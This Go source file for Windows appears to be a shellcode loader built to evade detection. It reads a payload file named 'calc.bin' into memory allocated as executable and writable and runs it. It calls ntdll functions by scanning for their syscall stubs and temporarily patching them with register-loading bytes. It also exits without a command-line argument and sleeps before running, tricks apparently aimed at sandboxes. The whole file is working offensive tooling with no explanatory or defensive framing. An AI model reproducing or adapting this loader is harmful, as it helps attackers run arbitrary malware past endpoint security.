package main

import (
	"fmt"
	"golang.org/x/sys/windows"
	"os"
	"syscall"
	"unsafe"
)

func uintptrToBytes(u *uintptr) []byte {
	return (*[unsafe.Sizeof(uintptr(0))]byte)(unsafe.Pointer(u))[:]
}

func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

var B uintptr

func main() {

	start := func() uintptr {
		if len(os.Args) < 2 {
			os.Exit(0)
		}
		return 0
	}
	p1 := syscall.NewCallback(start)

	syscall.SyscallN(p1)

	sc, _ := os.ReadFile("calc.bin")

	alloc := syscall.NewLazyDLL("ntdll").NewProc("NtAllocateVirtualMemory").Addr()

	handle := uintptr(0xffffffffffffffff)
	var baseA uintptr
	regionsize := uintptr(len(sc))

	Call(
		alloc,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(0x00001000|0x00002000),
		syscall.PAGE_EXECUTE_READWRITE,
	)

	memcpy(baseA, sc)
	B = baseA

	times := -(3000 * 10000)

	sleep := syscall.NewLazyDLL("ntdll").NewProc("NtDelayExecution").Addr()

	fmt.Println("Sleep 3s")
	Call(sleep, 0, uintptr(unsafe.Pointer(&times)))
	fmt.Println("Sleep 3s")
	Call(sleep, 0, uintptr(unsafe.Pointer(&times)))

	a := make([]byte, 10)

	b := make([]byte, 10)

	c := []byte{0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01}

	read := syscall.NewLazyDLL("ntdll").NewProc("NtReadVirtualMemory").Addr()

	fmt.Println("read")
	Call(read, 0xffffffffffffffff, uintptr(unsafe.Pointer(&c[0])), uintptr(unsafe.Pointer(&b[0])), 10, 0)
	fmt.Printf("%x\n", b)

	Call(read, 0xffffffffffffffff, uintptr(unsafe.Pointer(&c[0])), uintptr(unsafe.Pointer(&a[0])), 10, 0)
	fmt.Printf("%x\n", a)
	sss := func() uintptr {
		syscall.SyscallN(B)
		return 0
	}

	p := syscall.NewCallback(sss)

	syscall.SyscallN(p)

}

func Call(addr uintptr, args ...uintptr) uintptr {
	var n uintptr
	var r uintptr
	for i := uintptr(0); i < 30; i++ {
		if *(*byte)(unsafe.Pointer(addr + i)) == 0x0f &&
			*(*byte)(unsafe.Pointer(addr + i + 1)) == 0x05 &&
			*(*byte)(unsafe.Pointer(addr + i + 2)) == 0xc3 {
			n = i
		}
	}
	if n == 0 {
		return 0
	}

	if len(args) <= 4 {
		replace := GetParam(args...)
		if replace != nil {
			raw := make([]byte, len(replace))

			//backup
			for i := uintptr(0); i < uintptr(len(replace)); i++ {
				raw[i] = *(*byte)(unsafe.Pointer(addr + i + 18))
			}

			//patch
			windows.WriteProcessMemory(0xffffffffffffffff, addr+n, (*byte)(unsafe.Pointer(&replace[0])), uintptr(len(replace)), nil)

			//Call
			r, _, _ = syscall.SyscallN(uintptr(addr))

			//recover
			windows.WriteProcessMemory(0xffffffffffffffff, addr+n, (*byte)(unsafe.Pointer(&raw[0])), uintptr(len(replace)), nil)
		} else {
			r, _, _ = syscall.SyscallN(uintptr(addr))
		}

	} else {
		replace := GetParam(args[:4]...)
		raw := make([]byte, len(replace))

		//backup
		for i := uintptr(0); i < uintptr(len(replace)); i++ {
			raw[i] = *(*byte)(unsafe.Pointer(addr + i + 18))
		}

		//patch
		windows.WriteProcessMemory(0xffffffffffffffff, addr+n, (*byte)(unsafe.Pointer(&replace[0])), uintptr(len(replace)), nil)

		//Call
		//args[0] = 0
		args[1] = 0
		args[2] = 0
		args[3] = 0
		r, _, _ = syscall.SyscallN(uintptr(addr), args...)

		//recover
		windows.WriteProcessMemory(0xffffffffffffffff, addr+n, (*byte)(unsafe.Pointer(&raw[0])), uintptr(len(replace)), nil)

	}
	return r
}

func GetParam(args ...uintptr) []byte {
	var res []byte
	len0 := len(args)
	if len0 == 0 || len0 > 4 {
		return nil
	}
	//movabs rcx, args1;
	//movabs rdx, args2;
	//movabs r8, args3;
	//movabs r9, args4;
	switch len0 {
	case 1:
		t := args[0]
		r1 := uintptrToBytes(&t)
		res = append([]byte{0x48, 0xB9}, r1...)

	case 2:
		t := args[0]
		r1 := uintptrToBytes(&t)
		res = append([]byte{0x48, 0xB9}, r1...)

		t = args[1]
		r2 := uintptrToBytes(&t)
		res = append(res, append([]byte{0x48, 0xBA}, r2...)...)

	case 3:
		t := args[0]
		r1 := uintptrToBytes(&t)
		res = append([]byte{0x48, 0xB9}, r1...)

		t = args[1]
		r2 := uintptrToBytes(&t)
		res = append(res, append([]byte{0x48, 0xBA}, r2...)...)

		t = args[2]
		r3 := uintptrToBytes(&t)
		res = append(res, append([]byte{0x49, 0xB8}, r3...)...)

	case 4:
		//t := args[0]
		//r1 := uintptrToBytes(&t)
		//res = append([]byte{0x48, 0xB9}, r1...)

		t := args[1]
		r2 := uintptrToBytes(&t)
		res = append(res, append([]byte{0x48, 0xBA}, r2...)...)

		t = args[2]
		r3 := uintptrToBytes(&t)
		res = append(res, append([]byte{0x49, 0xB8}, r3...)...)

		t = args[3]
		r4 := uintptrToBytes(&t)
		res = append(res, append([]byte{0x49, 0xB9}, r4...)...)
	}

	return append(res, []byte{0x0F, 0x05, 0xC3}...)

}
